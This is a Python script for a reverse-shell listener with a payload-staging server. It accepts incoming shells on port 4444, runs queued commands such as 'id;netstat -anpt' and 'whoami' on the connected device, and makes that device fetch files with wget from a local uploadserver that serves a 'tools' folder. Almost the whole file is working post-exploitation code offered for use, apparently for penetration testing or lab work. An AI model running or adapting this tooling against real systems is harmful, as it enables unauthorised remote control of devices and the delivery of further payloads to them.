#!/usr/bin/env python3

import os, socket, time
import random, string
import subprocess as sub
import threading
import logging
import warnings

try:
    import uploadserver
except ImportError:
    try:
        sub.check_call(["pip3", "install", "uploadserver"])
    except:
        print("Install uploadserver failed")
        exit(1)

warnings.filterwarnings("ignore", category=DeprecationWarning)

import telnetlib


logging.basicConfig(format="[*] %(asctime)s - %(levelname)-8s%(message)s",
                    level=logging.DEBUG)

HTTP_IP     = "127.0.0.1"
HTTP_PORT   = 8000



class cmdtype:
    EXEC_CMD = 1
    GET      = 2
    PUT      = 3

def rand_string(length=12):
    return "".join(random.choices(string.ascii_letters+string.digits, k=length))
    
class shellserver:
    def __init__(self, port):
        self.port    = port
        self.ssock   = None
        self.DELIM   = rand_string().encode()
        self.server(port)


    def once_interact(self, cs, idata):
        delim=self.DELIM+b"\n"
        cs.write(idata.strip().encode() + b";echo " + delim)
        return cs.read_until(delim)

    def dispatch(self, cs, command, *args):
        match (command):
            case (cmdtype.EXEC_CMD):
                # execute shell command
                logging.info("start execute shell command")
                idata = args[0]
            case (cmdtype.GET):
                # get/download file
                logging.info("start download file from the device")
                remote_file, local_file = args
                idata = f"wget -O {remote_file} http://{HTTP_IP}:{HTTP_PORT}/{local_file}"                
            case (cmdtype.PUT):
                # put/upload file
                # remote_file, local_file = args
                logging.info("start upload file to the device")
                pass
            case (_):
                logging.warning("Unsupported command operations")
        # end match

        self.once_interact(cs, idata)

        # print(self.once_interact(cs, idata).decode())

    def server(self, port):
        self.ssock = socket.create_server(("", port), reuse_port=True)


    def interactive(self, cmdtasks=None):
        while True:
            conn, addr  = self.ssock.accept()
            print(f"*** Connection from host {addr} ***")
            cs          = telnetlib.Telnet()
            cs.sock     = conn
            if cmdtasks:
                if not os.fork(): # child process
                    for cmd in cmdtasks:
                        method, *args = cmd
                        self.dispatch(cs, method, *args)
                else:
                    conn.close()
            else:
                cs.interact()

def create_httpserver():
    p = sub.Popen(
        ["python3", "-m", "uploadserver", str(HTTP_PORT), "-d", "tools"],
        stdout=sub.PIPE,
        stderr=sub.PIPE,
        stdin=sub.PIPE
    )
    return p

def start_http(p):
    while p.poll() is None:
        logging.info(p.stderr.readline().decode().strip())
    
def stop_httpserver(p):
    p.kill()


def test_shellserver():
    ss = shellserver(4444)
    cmdtasks = [
        (cmdtype.EXEC_CMD, "id;netstat -anpt"),
        (cmdtype.EXEC_CMD, "whoami"),
        (cmdtype.GET, "/tmp/remote", "localfile")
    ]

    ss.interactive(cmdtasks)  # execute command
    # ss.interactive()

def test_httpserver():
    httpd = create_httpserver()
    try:
        t = threading.Thread(target=start_http, args=(httpd,))
        t.start()
        t.join()
    except KeyboardInterrupt:
        stop_httpserver(httpd)
        print("stop http server")


if __name__ == "__main__":
    ts = threading.Thread(target=test_shellserver)
    th = threading.Thread(target=test_httpserver)
    th.start()
    ts.start()
    # test_httpserver()